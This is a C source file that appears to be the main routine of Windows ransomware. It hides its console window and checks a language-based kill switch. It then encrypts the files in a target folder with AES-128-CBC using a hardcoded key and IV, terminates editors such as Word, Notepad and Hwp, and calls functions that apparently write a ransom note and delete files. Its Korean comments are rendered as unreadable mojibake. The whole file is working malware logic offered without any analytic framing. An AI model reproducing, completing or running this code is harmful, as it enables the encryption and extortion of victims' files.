#pragma warning ( disable : 4996 )

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <io.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <tchar.h>
#include "process.h"
#include "file.h"
#include "reg.h"

extern _finddata_t fd;
void _tmain()
{
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);

	if (KillSwitch()) {
		char opt = {};													// �ɼ� ����
		int keyLen, ivLen;											// �Էµ� key ��, iv ��
		unsigned char key[EVP_MAX_KEY_LENGTH];						// key ����
		unsigned char iv[EVP_MAX_IV_LENGTH];						// iv ����
		const EVP_CIPHER *cipher = EVP_enc_null();					// ��ȣ �˰���

		int mode = 0;

		intptr_t handle;

		char pathAll[_MAX_PATH] = "C:\\Users\\gmm\\Desktop\\test";
		char pathSub[_MAX_PATH];

		strcat(pathAll, "\\");
		strcpy(pathSub, pathAll);
		strcat(pathAll, "*");

		OpenSSL_add_all_ciphers(); 		// EVP_get_cipherbyname()�� ����ϱ� ���� ȣ��.
		cipher = EVP_get_cipherbyname("aes-128-cbc");

		memcpy(key, "password01234567", keyLen = EVP_CIPHER_key_length(cipher));
		memcpy(iv, "iv12345678901234", ivLen = EVP_CIPHER_iv_length(cipher));

		mode = 0;

		if ((handle = _findfirst(pathAll, &fd)) == -1)
		{
			printf("No such file or directory\n");
		}

		while (_findnext(handle, &fd) == 0)
		{
			SearchFile(pathSub, cipher, mode, key, iv);
		}
		_findclose(handle);


		TCHAR* TargetProcess[5] = { "notepad.exe", "WINWORD.EXE", "wordpad.exe", "Hwp.exe", "Microsoft.Photos.exe" };
		//���� ��� ���μ��� : �޸���, Microsoft Word, �����е�, ���Ŀ��ǽ� �ѱ�, ������

		for (int i = 0; i < 5; i++) {
			if (_tcscmp(TargetProcess[i], _T("EXIT")) == 0)
				exit(EXIT_SUCCESS);
			KillProcess(TargetProcess[i]);
		}

		CreateNote();
		DeleteExpired(pathSub);
		exit(0);
	}
	else printf("current language is not Korean");
}